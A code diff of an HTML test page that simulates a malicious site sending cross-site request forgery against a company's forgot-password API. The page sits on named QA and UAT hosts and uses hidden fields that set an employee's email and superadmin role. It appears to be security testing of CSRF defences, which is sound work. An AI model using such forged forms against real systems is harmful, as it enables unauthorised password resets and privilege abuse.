@@ -9,28 +9,34 @@
 
 <p>This simulates a malicious site attempting to trigger a forgot password request.</p>
 
-<!-- Direct form submission (no JS required → CSP safe) -->
-<form action="http://localhost/api/tenant/v1/merchants/testroute" method="POST">
-  
-  <!-- Payload -->
+<h2>1️⃣ QA Environment (No CSRF Token)</h2>
+<form action="https://grow-qa.fareye.io/api/tenant/v1/merchants/testroute" method="POST">
   <input type="hidden" name="email" value="anandita.sharma@getfareye.com">
-
-  <!-- Extra fields (if backend expects them) -->
   <input type="hidden" name="tenant" value="couriersplease">
   <input type="hidden" name="userType" value="superadmin">
   <input type="hidden" name="role" value="superadmin">
-
-  <button type="submit">🚨 Trigger CSRF Attack</button>
+  <button type="submit">🚨 Trigger CSRF Attack (QA)</button>
 </form>
 
 <hr>
 
-<h3>Expected Result:</h3>
+<h2>2️⃣ UAT Environment (With CSRF Token)</h2>
+<form id="uatForm" action="https://grow-uat.fareye.co/api/tenant/merchants/forgot-password" method="POST">
+  <input type="hidden" name="email" value="anandita.sharma@getfareye.com">
+  <input type="hidden" name="tenant" value="couriersplease">
+  <input type="hidden" name="userType" value="superadmin">
+  <input type="hidden" name="role" value="superadmin">
+  <!-- Note: You cannot send X-XSRF-TOKEN via plain form; this simulates a safe request -->
+  <button type="submit">✅ Trigger Valid Request (UAT)</button>
+</form>
+
+<hr>
+
+<h3>Expected Results:</h3>
 <ul>
-  <li>Request is sent from browser ✔️</li>
-  <li>Cookies (session) are included ✔️</li>
-  <li>But CSRF token is missing ❌</li>
-  <li><strong>Backend rejects request ✅</strong></li>
+  <li>QA button: request is sent but backend rejects (missing CSRF token) ❌</li>
+  <li>UAT button: request is accepted if CSRF token is present ✅</li>
+  <li>Browser sends cookies automatically in both cases ✔️</li>
 </ul>
 
 </body>
